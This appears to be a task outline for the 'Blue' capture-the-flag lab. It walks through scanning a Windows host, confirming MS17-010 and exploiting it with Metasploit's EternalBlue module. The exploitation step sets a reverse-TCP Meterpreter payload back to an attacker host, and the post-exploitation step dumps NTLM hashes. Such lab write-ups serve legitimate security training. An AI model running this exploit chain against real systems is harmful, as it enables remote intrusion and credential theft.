# Blue — Tasks

## Task 1: Reconnaissance
- **Purpose:** Scan the target to identify open ports and services, focusing on SMB.
- **Skills:** Nmap scanning, port discovery, service detection.
- **Commands:** `nmap -sV -p- <target>`, `nmap -sV -p 135,139,445 <target>`
- **Theory:** The target runs Windows with SMB (port 445) exposed. Nmap identifies the Windows version and SMB service details, which are critical for confirming MS17-010 vulnerability. The `-sV` flag performs version detection. Scanning all ports ensures no other attack surfaces are missed.

## Task 2: Vulnerability Identification
- **Purpose:** Confirm the MS17-010 vulnerability on the target.
- **Skills:** NSE script usage for vulnerability scanning.
- **Commands:** `nmap --script=smb-vuln-ms17-010 <target>`, `search ms17-010`
- **Theory:** The Nmap NSE script smb-vuln-ms17-010 tests the target for the EternalBlue vulnerability. It sends specific SMB packets to check if the system is vulnerable. Metasploit can also search for the exploit module. Confirming the vulnerability before exploitation prevents wasted effort on patched systems.

## Task 3: Exploitation
- **Purpose:** Exploit MS17-010 to gain a Meterpreter session on the target.
- **Skills:** Exploit module configuration, payload selection, trigger.
- **Commands:** `use exploit/windows/smb/ms17_010_eternalblue`, `set RHOSTS <target>`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `set LHOST <attacker>`, `exploit`
- **Theory:** The ms17_010_eternalblue exploit module sends a specially crafted SMB transaction to trigger a buffer overflow in the SMB driver. Successful exploitation executes the payload with SYSTEM privileges, bypassing user account control. The EternalBlue exploit was developed by the NSA and leaked by the Shadow Brokers group in 2017.

## Task 4: Post-Exploitation
- **Purpose:** Extract flags and sensitive information from the compromised system.
- **Skills:** Shell navigation, hash dumping, flag retrieval.
- **Commands:** `getsystem`, `hashdump`, `shell`, `dir`, `type <flag_file>`
- **Theory:** The Meterpreter session already runs with SYSTEM privileges (EternalBlue exploits at ring-0 level). Use hashdump to extract NTLM hashes. Navigate the file system using the shell or Meterpreter commands to find flag files. Flags are typically text files in user directories or system locations.
